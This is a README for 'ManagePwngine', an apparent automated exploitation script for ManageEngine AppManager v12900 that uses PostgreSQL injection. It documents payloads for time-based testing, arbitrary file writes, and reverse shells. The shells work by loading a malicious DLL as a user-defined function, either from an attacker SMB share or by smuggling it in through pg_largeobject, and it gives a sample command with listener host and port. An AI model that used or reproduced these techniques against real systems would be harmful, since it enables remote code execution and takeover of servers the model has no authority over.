# ManagePwngine
Automatic exploitation script for ManageEngine AppManager v12900. 
Principles apply to any PostgreSQL injection.

# Usage

There are 4 payload types included with this tool:
- sleep
- shell
- write
- ezshell

Each payload type has slightly different requirements.

This tool can be used once a payload is selected:
`python3 ManagePwngine.py {payload} {target} {arguments}`

For example:
`python3 ManagePwngine.py ezshell localhost --dll shell.dll --lhost 192.168.0.1 --lport 1337`

All payloads require a payload and a target. Certain payloads require more configuration.

## sleep

The `sleep` payload requires no additional arguments. A `sleep()` function will be injected and the database will hang.
This payload is recommended as a first-pass to validate whether or not injection is possible against the target.

![sleep payload](/static/sleep.png)

## write

The `write` payload requires no additional arguments.
The payload will write a `test.txt` file to `C:\test.txt` with the contents `pwned` using a `COPY TO` injection. This can be modified as needed
to write arbitrary files in arbitrary locations.

![write payload](/static/write.png)

## shell

The `shell` payload requires the following arguments:
- `--lhost`: Your listener IP.
- `--lport`: Your listener port.
- `--dll`: The name of the malicious DLL that will be loaded remotely by PostgreSQL. See the DLL section for more information.
- `--smbshare`: The name of your SMB share hosting the malicious DLL.

Optionally:
- --function: The name of the function within the DLL that creates the reverse shell connection. See the DLL section for more information.

The payload will use `CREATE OR REPLACE FUNCTION` to create a User-Defined Function (UDF) that PostgreSQL will load from a remote location - your SMB share.
Once the UDF is created, it is triggered to call your reverse shell. The success of this injection hinges on your compiled DLL.

![shell payload](/static/shell.png)

## ezshell

The `ezshell` payload requires the following arguments:
- `--lhost`: Your listener IP.
- `--lport`: Your listener port.
- `--dll`: The name of the malicious DLL saved locally.

Optionally:
- --function: The name of the function within the DLL that creates the reverse shell connection. See the DLL section for more information.

The payload will inject your DLL into the `pg_largeobject` table, 2048 bytes at a time. Once the full binary is loaded, the large object (LO) will be exported,
then a UDF will be created and triggered using the newly-saved DLL. This is considered 'ez' since there is no SMB setup or remote calls required, so this is
exploitable remotely.

![ezshell payload](/static/ezshell.png)

---

# DLL Information

The malicious DLL needs to be compiled with a `PG_MODULE_MAGIC` macro. There are several references online, like:

- https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions#rce-in-windows
- https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html

If you create a function name other than `connect_back` within the DLL, you'll need to provide it to the `shell` or `ezshell` payloads with `--function`.